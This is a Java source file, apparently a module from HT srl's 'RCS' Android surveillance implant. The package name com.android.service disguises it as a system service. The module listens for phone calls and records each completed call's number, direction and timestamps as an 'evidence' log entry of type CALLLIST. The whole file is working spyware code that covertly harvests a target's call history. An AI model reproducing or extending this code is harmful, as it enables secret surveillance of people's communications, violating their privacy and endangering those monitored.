/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentCallList.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module;

import com.android.service.Call;
import com.android.service.LogR;
import com.android.service.Messages;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfModule;
import com.android.service.conf.ConfigurationException;
import com.android.service.evidence.EvidenceType;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerCall;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.DateTime;
import com.android.service.util.WChar;

public class ModuleCallList extends BaseModule implements Observer<Call> {
	private static final String TAG = "ModuleCallList"; //$NON-NLS-1$
	private static boolean record = false;
	
	@Override
	public boolean parse(ConfModule conf) {
		if (conf.has("record")) {
			try {
				record = conf.getBoolean("record");
			} catch (ConfigurationException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				record = false;
			}
		}

		return true;
	}

	@Override
	public void actualGo() {

	}

	@Override
	public void actualStart() {
		ListenerCall.self().attach(this);

		if (record) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart): recording calls"); //$NON-NLS-1$
			}
		}
	}

	@Override
	public void actualStop() {
		ListenerCall.self().detach(this);
	}

	public int notification(Call call) {
		final String name = ""; //$NON-NLS-1$
		final boolean missed = false;
		final String nametype = Messages.getString("7.0"); //$NON-NLS-1$
		final String note = Messages.getString("7.1"); //$NON-NLS-1$

		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): number: " + call.getNumber()); //$NON-NLS-1$
		}
		
		if (call.isComplete() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): call not yet established"); //$NON-NLS-1$
			}

			return 0;
		}
		
		final boolean outgoing = !call.isIncoming();
		final int duration = call.getDuration(call);
		final int LOG_CALLIST_VERSION = 0;

		int len = 28; // 0x1C;

		final String number = call.getNumber();
		len += wsize(number);
		len += wsize(name);
		len += wsize(note);
		len += wsize(nametype);

		final byte[] data = new byte[len];

		final DataBuffer databuffer = new DataBuffer(data, 0, len);

		final DateTime from = new DateTime(call.getTimestamp());
		final DateTime to = new DateTime(call.getTimestamp());

		databuffer.writeInt(len);
		databuffer.writeInt(LOG_CALLIST_VERSION);
		databuffer.writeLong(from.getFiledate());
		databuffer.writeLong(to.getFiledate());

		final int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
		databuffer.writeInt(flags);

		addTypedString(databuffer, (byte) 0x01, name);
		addTypedString(databuffer, (byte) 0x02, nametype);
		addTypedString(databuffer, (byte) 0x04, note);
		addTypedString(databuffer, (byte) 0x08, number);

		new LogR(EvidenceType.CALLLIST, null, data);

		return 0;
	}

	private int wsize(String string) {
		if (string.length() == 0) {
			return 0;
		} else {
			return string.length() * 2 + 4;
		}
	}

	public synchronized static void addTypedString(DataBuffer databuffer, byte type, String name) {
		if (name != null && name.length() > 0) {
			final int header = (type << 24) | (name.length() * 2);
			databuffer.writeInt(header);
			databuffer.write(WChar.getBytes(name, false));
		}
	}
}
